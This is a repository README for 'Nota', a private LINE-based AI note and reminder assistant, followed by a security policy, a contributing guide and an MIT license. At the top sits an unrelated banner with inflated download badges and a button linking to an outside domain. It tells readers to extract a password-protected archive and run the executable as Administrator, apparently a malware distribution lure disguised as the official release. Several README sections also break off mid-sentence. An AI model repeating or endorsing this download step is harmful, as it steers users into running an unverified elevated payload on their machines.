<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Nota

私人 LINE AI 記事助理（原專案代號「LINE AI 記事本」）。

版本、修改紀錄、問題解法、完整架構、部署與回滾證據集中記錄於
## 功能

- LINE 文字、照片、音訊、影片與一般檔案接收
- Telegram 私人頻道保存原始檔
- TXT、CSV、PDF、DOCX、XLSX、PPTX 本機文字擷取
- Groq 為主要圖片辨識模型，Cloudflare 為唯一備援；對話理解與搜尋回答由 Gemini 負責
- 跨訊息對話狀態與欄位補全，例如先說事項、下一句再說時間
- 結構化指涉記憶：找到資料後可直接接著說「傳給我、刪掉、就是這個」
- 可控的自主學習：自動學習明確偏好、別名、事實與結果修正，並可撤銷
- 中央意圖路由：先判斷完整動作，再決定是否承接上一句，避免狀態攔截新指令
- 自然語言建立、修改、取消及查詢提醒
- 長文件分段索引、關鍵字＋向量混合搜尋與語意重排
- 啟動時只重建缺少目前模型識別資訊的舊向量，不重複索引已完成資料
- Webhook 去重、交易式發送佇列、LINE retry key 與重啟補送
- 10 分鐘短效下載連結

## 指令

| 指令 | 功能 |
|---|---|
| `/找 關鍵內容` | 搜尋記事 |
| `/最近` | 顯示最近 10 則 |
| `/原文 123` | 查看原文或取得原檔 |
| `/刪除 123` | 刪除單一記事與 Telegram 原檔 |
| `/清空` | 顯示二次確認 |
| `/清空 確認` | 永久清空全部記事 |

一般敘述預設保存，也可以直接使用自然語言搜尋、取消與設定提醒。未完成的要求會保存成
對話任務，例如先說「等等提醒我要吃藥」，下一句再回答「1.36」。

圖片、檔案或連結搜尋結果會先傳一至兩行簡短說明，最後一行標示「這是找到的圖片／
檔案／連結。」，再於同一次 LINE 請求中傳送圖片或原始連結。只有純時間回答才會承接
上一個提醒；新的刪除、搜尋或建立指令會先由中央路由處理。

長期學習資料與記事相同，私人聊天按使用者隔離、群組按聊天室隔離。系統只保存使用者
明確說出的穩定偏好、別名、事實與修正，不會把模型推測當成事實，也不會跨聊天室學習。

## 架構與限制

```text
LINE webhook
    │
    ▼
FastAPI ── 中央意圖路由、對話狀態與結構化指令
    ├── PostgreSQL（正式）／SQLite（本機開發、測試）：使用者、對話事件、未完成任務、
    │     記事、附件、內容分段、提醒、交易式發送佇列、發送嘗試與 Webhook 工作佇列
    ├── 全文檢索＋向量：分段混合搜尋與重排
    ├── Telegram 私人頻道：原始檔
    ├── Groq／Cloudflare：圖片辨識（Groq 主要，Cloudflare 唯一備援）
    └── Gemini：對話理解、摘要、搜尋回答、語意重排
```

提醒時間以 UTC 保存並保留使用者時區。輸入可以使用 `1.36`，輸出統一顯示為
「今天下午 1:36」；提醒到期訊息使用「記得吃藥。」等自然語句。提醒資料與待發送事件
在同一筆資料庫交易中建立，服務重啟後會使用相同 retry key 繼續補送，避免漏發或重複。

- 第一版每個檔案上限 20MB。一般 Telegram Bot API 雖可上傳較大檔案，
  `getFile` 下載仍限制 20MB，因此使用可完整取回的保守上限。
- LINE Messaging API 不能直接傳送一般文件。`/原文` 會產生短效 HTTPS 下載連結；
  圖片會透過相同的安全端點回傳 LINE。
- Telegram Cloud Chat 不是端對端加密。高度敏感的內容不應在未另行加密時上傳。
- Gemini 免費層內容可能被用於改善 Google 產品。正式私密環境應評估付費層條款。

## 建立必要帳號

1. LINE Developers 建立 Messaging API Channel，取得：
   - Channel Secret
   - Channel Access Token
2. Telegram `@BotFather` 建立 Bot。
3. 建立私人 Telegram 頻道，把 Bot 加為管理員並允許發文、刪除訊息。
4. Google AI Studio 建立 Gemini API Key。
5. Cloudflare AI 帳號（圖片辨識備援、embedding 主要供應商）。
6. Groq 建立 API Key（圖片辨識主要供應商；免費額度即可）。
7. 準備固定 HTTPS 網址，建議使用 Cloudflare Tunnel。
8. 正式環境需另外準備 PostgreSQL（`vector`／`pgcrypto` extension、`DATABASE_URL`、
   租戶隔離用的 RLS 角色設定），完整步驟見
## 本機開發

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
cp .env.example .env
pytest
uvicorn app.main:create_app --factory --reload
```

健康檢查：

```bash
## LINE 群組使用

- 群組內標註 `@AI記事本` 才會執行指令。
- 可以先傳文字、照片、檔案或連結，再標註記事本；也可以先標註再傳內容。
- 回覆群組訊息並標註記事本時，會以被回覆的內容作為精確上下文。
- 未標註的群組內容只暫存 7 天供引用，不會直接建立記事或跨聊天室搜尋。
- 暫存接續時間預設 10 分鐘，暫存檔總量預設上限 1GB。
- 群組提醒可標註成員；只寫名字時會在該群組已知成員中解析。

## 樹莓派 4 安裝

建議使用 Raspberry Pi OS Lite 64-bit、Python 3.11 以上。

```bash
cd 專案目錄
sudo bash scripts/install_pi.sh
sudo nano /opt/ai-notebook/.env
sudo systemctl enable --now ai-notebook
sudo systemctl status ai-notebook
```

Cloudflare Tunnel 範例在 `deploy/cloudflared-config.yml.example`。完成 DNS 與 tunnel
設定後，將 `PUBLIC_BASE_URL` 設成相同的 HTTPS 網址。

## Telegram 頻道 ID

先把 Bot 加入私人頻道並發一則測試訊息，再呼叫：

```text
## 備份

**本機開發／測試（SQLite）**：位於 `DATA_DIR/notebook.db`。使用 SQLite 線上備份指令，
不要在服務運作時直接複製資料庫檔：

```bash
sqlite3 /opt/ai-notebook/data/notebook.db \
  ".backup '/安全位置/notebook-$(date +%F).db'"
```

**正式環境（PostgreSQL）**：使用 `pg_dump`，備份與還原流程見


---

# Security Policy

## Reporting a Vulnerability

If you discover a security issue, please do **not** create a public GitHub Issue.

Instead, contact the maintainer privately and include:

- A description of the issue
- Steps to reproduce
- The affected version
- Any suggested mitigation (if available)

Security reports will be reviewed before public disclosure.

## Scope

This project may process:

- LINE messages
- Attachments
- Reminder data
- SQLite databases
- Telegram file storage

Please do not include private API keys, access tokens, or personal data in bug reports.


---

# Contributing

Thank you for your interest in contributing to LINE AI Notebook.

## Reporting Issues

If you find a bug, please create a GitHub Issue and include:

- A clear description
- Steps to reproduce
- Expected behavior
- Actual behavior
- Environment information

## Pull Requests

Before submitting a pull request:

1. Keep changes focused.
2. Add or update tests when appropriate.
3. Update documentation if behavior changes.
4. Ensure existing tests pass before submitting.

## Development

Install dependencies:

```bash
pip install -e ".[dev]"
```

Run tests:

```bash
pytest
```

Start the development server:

```bash
uvicorn app.main:create_app --factory --reload
```


---

﻿MIT License

Copyright (c) 2026 Ken

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
